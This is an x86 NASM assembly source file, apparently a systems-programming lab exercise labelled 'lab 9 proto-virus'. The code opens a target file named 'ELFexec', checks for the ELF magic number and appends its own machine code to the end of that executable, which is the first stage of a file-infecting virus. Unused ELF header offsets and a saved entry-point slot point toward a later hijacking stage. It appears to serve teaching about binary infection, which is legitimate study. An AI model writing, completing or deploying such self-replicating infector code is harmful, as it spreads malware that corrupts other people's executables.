%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define STDOUT 1

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
write STDOUT,OutStr,32
open FileName,RDWR,0777;fd goes to eax
mov [esp],eaX ;put fd in stack
cmp dword[esp],0 ;check if open failed
jl Failed
;CheckELF
mov eax,[esp];put fd in eax
add esp,4;move position after fd in stack
read eax,esp,4
sub esp,4;return to top of stack
cmp dword[esp+4], 0x464c457f ;magic number
jne Failed

;write virus to end of file
mov eax,[esp]
lseek eax,0,SEEK_END
mov eax,[esp]
mov ecx,_start
mov ebx,virus_end;ebx will hold the size of start untill the end
sub ebx,_start
write eax,ecx,ebx


VirusExit:
	mov eax,[esp]
	close eax
    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Failed:
	mov eax,[esp]
	close eax
	write STDOUT,Failstr,13
	exit 1

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
PreviousEntryPoint: dd VirusExit
virus_end:


